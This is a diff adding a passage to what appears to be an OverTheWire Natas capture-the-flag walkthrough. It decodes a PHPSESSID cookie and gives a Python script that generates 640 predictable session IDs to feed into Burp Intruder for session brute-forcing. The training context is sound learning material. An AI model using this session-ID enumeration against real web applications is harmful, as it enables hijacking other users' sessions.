@@ -1343,7 +1343,56 @@ Sending it over to repeater
 
 As you can see the value for ```PHPSESSID``` is different unlike the one we saw in the previous level.
 
+Lets try to decode this ```PHPSESSID``` using [cyberchef](https://gchq.github.io/CyberChef/)
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/734b4f63-2e5a-4930-8c58-b22464472fe4)
+
+If you recall from the source code of the previous level we saw that ```$maxid = 640```, so one thing we'll try is to generate new ```PHPSESSID```. To do this we'll be using a python script
+
+```python
+def number_to_blackanon_hex(number):
+    if not 1 <= number <= 640:
+        raise ValueError("Number must be between 1 and 640.")
+
+    # Append "BlackAnon" to the number
+    blackanon_string = str(number) + "-BlackAnon"
+
+    # Convert the string to hexadecimal representation
+    hex_representation = blackanon_string.encode().hex()
+
+    return hex_representation
+
+# Open the file in write mode
+with open("phpsessid.txt", "w") as file:
+    # Write the output for numbers from 1 to 640 to the file
+    for number in range(1, 641):
+        hex_result = number_to_blackanon_hex(number)
+        line = f"{hex_result}\n"
+        file.write(line)
+
+print("Output has been written to phpsessid.txt")
+```
+The script takes numbers from 1 to 640, appends "-BlackAnon" to each number, converts them to hexadecimal representation, and writes the results to a file named "phpsessid.txt."
+
+save the script in a file and run it
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/over_the_wire]
+└─$ python phpsessid.py
+Output has been written to phpsessid.txt
+                                                                                                                                                                                                                                
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/over_the_wire]
+└─$ cat phpsessid.txt
+312d426c61636b416e6f6e
+322d426c61636b416e6f6e
+332d426c61636b416e6f6e
+342d426c61636b416e6f6e
+352d426c61636b416e6f6e
+362d426c61636b416e6f6e
+
+...
+```
+We'll send the request to intruder
 
 
 
